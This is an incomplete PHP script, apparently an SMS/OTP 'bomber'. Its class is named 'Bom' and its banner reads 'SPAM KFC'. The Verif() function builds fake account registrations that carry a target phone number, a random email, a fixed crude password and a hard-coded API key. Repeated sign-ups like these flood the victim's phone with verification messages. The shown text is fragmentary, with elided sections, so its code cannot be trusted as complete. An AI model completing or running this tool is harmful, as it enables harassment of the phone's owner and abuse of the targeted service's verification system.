...
$charactersLength - 1)];
    ...
    public function Verif()
    {
        ...
        $no = $this->no;
        $data = 
"fullname=wahhuwauh+ayam&handphone={$no}&email={$this->angka()}{$this->huruf()}%40gmail.com&password=peler123&confirm_password=peler123&language_id=ID&X-API-KEY=563f204a20876f1fa0b20523bdfd0728";
...
$init = new Bom();
echo $green."
____  ____   _    __  __   _  _______ ____
/ ___||  _ \ / \  |  \/  | | |/ /  ___/ ___|
\___ \| |_) / _ \ | |\/| | | ' /| |_ | |
 ___) |  __/ ___ \| |  | | | . \|  _|| |___
